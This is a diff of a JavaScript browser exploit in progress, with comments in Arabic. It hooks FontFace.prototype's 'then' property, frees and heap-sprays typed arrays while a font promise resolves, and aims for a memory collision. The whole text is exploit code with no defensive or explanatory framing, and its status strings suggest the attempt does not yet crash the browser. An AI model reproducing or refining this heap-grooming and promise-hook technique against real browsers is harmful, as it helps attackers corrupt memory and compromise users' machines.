@@ -9,8 +9,35 @@
         for (let i = 0; i < 500; i += 2) fillers[i] = null;
 
         // 2. تفعيل الثغرة
-        function triggerTargetedExploit() {
+                function triggerTargetedExploit() {
             document.getElementById('status').innerHTML = "Triggering...";
+            
+            // 1. تعريف الـ Font
+            let font = new FontFace('ExploitFont', 'local(Arial)', { unicodeRange: 'U+0041' });
+            document.fonts.add(font);
+
+            // 2. تفعيل الـ Hook بقوة أكبر
+            Object.defineProperty(FontFace.prototype, 'then', {
+                configurable: true,
+                get() {
+                    // إجبار الذاكرة على الاستجابة فوراً
+                    document.getElementById('status').innerHTML = "Collision Attempted!";
+                    
+                    // تحرير الذاكرة وتعبئتها فوراً (Heap Spray)
+                    for (let i = 0; i < 500; i++) {
+                        fillers[i] = new Uint32Array(32); 
+                    }
+                    
+                    return undefined;
+                }
+            });
+
+            // 3. التحميل مع "إجبار" الـ Promise على العمل
+            document.fonts.load('1em ExploitFont', 'A').then(() => {
+                document.getElementById('status').innerHTML = "Load Finished (No Crash)";
+            });
+        }
+
             
             let font = new FontFace('ExploitFont', 'local(Arial)', { unicodeRange: 'U+0041' });
             document.fonts.add(font);
